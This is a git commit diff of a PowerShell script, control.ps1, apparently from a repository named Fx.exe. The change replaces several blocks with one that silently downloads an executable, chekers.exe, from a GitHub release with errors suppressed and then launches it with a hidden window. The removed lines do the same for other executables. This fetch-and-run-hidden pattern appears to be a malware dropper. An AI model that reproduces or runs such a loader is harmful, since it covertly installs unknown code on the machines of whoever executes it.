9801e721f85b005c25dd6a2571a814decf71d378
kilordow <petrovolosuk310@gmail.com>
2026-03-04 00:27:03 +0200

    Update control.ps1

--- control.ps1
+++ control.ps1
@@ -1,18 +1,7 @@
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/chenger.exe" -OutFile "chenger.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekers.exe" -OutFile "chekers.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "chenger.exe" -WindowStyle Hidden
-    
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/releases/download/lol/chekir.exe" -OutFile "chekir.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "chekir.exe" -WindowStyle Hidden
-
-Invoke-WebRequest -Uri "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/chenger.exe" -OutFile "chenger.exe" -ErrorAction SilentlyContinue
-    
-    # Запускаем 
-    Start-Process -FilePath "chenger.exe" -WindowStyle Hidden
-
+    Start-Process -FilePath "chekers.exe" -WindowStyle Hidden
 
 
 
